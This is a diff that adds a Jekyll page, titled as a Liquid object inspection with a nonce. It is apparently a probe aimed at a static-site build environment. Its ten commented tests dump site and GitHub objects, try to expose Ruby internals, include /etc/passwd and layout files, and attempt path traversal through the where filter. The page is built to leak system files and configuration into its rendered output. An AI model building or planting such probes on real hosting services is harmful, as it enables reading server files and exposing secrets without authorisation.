@@ -1,0 +1,54 @@
+---
+layout: null
+---
+<!DOCTYPE html><html><body>
+<h2>Liquid Object Inspection - Nonce: 35618</h2>
+
+<!-- Test 1: site object -->
+<p id="site-keys">site_keys: {{ site | map: 'keys' | join: ',' }}</p>
+<p id="jekyll-env">jekyll_env: {{ jekyll.environment }}</p>
+<p id="jekyll-ver">jekyll_ver: {{ jekyll.version }}</p>
+
+<!-- Test 2: page object internal vars -->
+<p id="page-path">page_path: {{ page.path }}</p>
+<p id="page-dir">page_dir: {{ page.dir }}</p>
+<p id="page-id">page_id: {{ page.id }}</p>
+
+<!-- Test 3: site.config (if exposed) -->
+<p id="site-url">site_url: {{ site.url }}</p>
+<p id="site-baseurl">baseurl: {{ site.baseurl }}</p>
+<p id="theme">theme: {{ site.theme }}</p>
+
+<!-- Test 4: Internal Ruby objects via Liquid filters -->
+<p id="inspect">inspect: {{ site | inspect }}</p>
+<p id="class">class: {{ site.class }}</p>
+
+<!-- Test 5: Environment variables via liquid -->
+{%- assign env_test = site.github -%}
+<p id="github-obj">github: {{ site.github | inspect }}</p>
+
+<!-- Test 6: file system probing via include -->
+{%- capture fs_probe -%}
+  {%- include /etc/passwd -%}
+{%- endcapture -%}
+<p id="fs1">fs_probe: {{ fs_probe }}</p>
+
+<!-- Test 7: Template dir access -->
+{%- capture layout_probe -%}
+  {%- include _layouts/default.html -%}
+{%- endcapture -%}
+<p id="layout">layout: {{ layout_probe | truncate: 50 }}</p>
+
+<!-- Test 8: Liquid objects that might expose Ruby internals -->
+<p id="forloop">forloop test: {% for i in (1..3) %}{{ i }}{% endfor %}</p>
+<p id="tablerow">tablerow: {% tablerow i in (1..2) cols:2 %}{{ i }}-{{ tablerowloop.index }}{% endtablerow %}</p>
+
+<!-- Test 9: Where clause (Jekyll 4.0+ filter) -->
+{%- assign test_arr = site.pages | where: "path", "../../../etc/passwd" -%}
+<p id="where-test">where: {{ test_arr | inspect }}</p>
+
+<!-- Test 10: find_file filter (if available) -->
+{%- assign found = "/etc/passwd" | absolute_url -%}
+<p id="abs-url">absolute_url: {{ found }}</p>
+
+</body></html>
